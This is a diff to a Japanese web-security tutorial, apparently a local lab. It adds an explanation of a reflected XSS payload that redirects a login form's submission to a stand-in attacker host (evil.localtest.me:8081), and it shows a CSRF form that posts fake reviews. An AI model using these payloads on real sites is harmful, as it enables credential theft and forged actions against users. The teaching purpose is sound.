@@ -179,6 +179,8 @@ localhostに別名を与えるのによく使うのはhostsファイルですが
 > 
 > https://weblogs.asp.net/owscott/introducing-testing-domain-localtest-me
 
+攻撃者のサイトを起動します。
+
 ```console
 > .\venv\Scripts\activate
 (venv)> py evil.py
@@ -188,6 +190,14 @@ localhostに別名を与えるのによく使うのはhostsファイルですが
 
 ```
 http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}</script>
+```
+
+攻撃者が仕込んだスクリプトは次の通りです。window.onload はページの読み込みが終了すると実行されます。フォームの```action```属性を攻撃者のURLに変更しています。
+
+```javascript
+window.onload = function() {
+  document.querySelector('form').action='http://evil.localtest.me:8081/users'
+}
 ```
 
 利用者が送信ボタンを押してしまうと入力した情報が攻撃者に渡ってしまいます。攻撃者が盗み出した情報は、Firefoxで確認できます。
@@ -282,7 +292,7 @@ http://localhost:8080/products/1
 http://evil.localtest.me:8081/game2
 ```
 
-クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げるだけでなく、XSSを埋め込んでうその金額にページを書き換えてしまいます。window.onload はページの読み込みが終了すると実行されます。
+クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げるだけでなく、XSSを埋め込んでうその金額にページを書き換えてしまいます。
 
 ```html
 <form action="http://localhost:8080/reviews" method="post">
